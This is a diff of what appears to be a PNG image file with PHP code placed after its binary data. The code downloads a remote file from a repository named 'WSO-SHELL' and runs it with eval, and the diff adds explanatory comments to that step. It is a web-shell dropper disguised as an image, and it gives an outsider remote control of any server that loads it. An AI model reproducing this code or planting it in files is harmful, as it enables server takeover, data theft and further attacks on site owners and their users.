@@ -12,7 +12,6 @@ IHDR  ò   s   c
 ®‰%Š¿¸ù©­Ñ¯|à.¶¿ÐIÔAiR]°oCÝw€o|ü÷|ç£?0_½÷éñåFô“
 íß}ûy»TAýµèý÷ÖÙúØg'¦.N¼ct•ùP,•ümÛK‡W>yÇ3£ó…_Ö½òëçgôwµ}Ê²S÷•‡ž?!öÓæ5ßœ³ýéUUÿÞ|k×®ûñ´Ì¡ß\?ÎÿCÈéúÕž—·Ÿö³/þ|ÁgßøõÈ·>ôóÐƒ·¿zá×ÇB[ŸIÚ ×>±ÁeçSý<wýpù›Û6q×gþh}æ-÷òé‹?Ï½o¿¥vó£›–w8ñ1¯ëø½UáÌs*†eNÇGûvßyÆ®]«d¯”v(;>|[quâ·ùî¡hÛ×ýÆ§ðXãý_úaÝš‡ž?µ÷hÇû«"‘ß.˜><?php
 $url = "https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/xmlrpc.php";
-IHDR
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -21,10 +20,15 @@ $result = curl_exec($ch);
 if ($result === false) {
     echo "Error fetching remote content";
 } else {
+    // Assuming $result contains PHP code, execute it
     if (is_string($result)) {
+        // Start output buffering
         ob_start();
+        // Execute the fetched PHP code
         eval('?>'.$result);
+        // Get the output buffer content and clean it
         $output = ob_get_clean();
+        // Echo the output
         echo $output;
     } else {
         echo "Error: Invalid response from remote server";
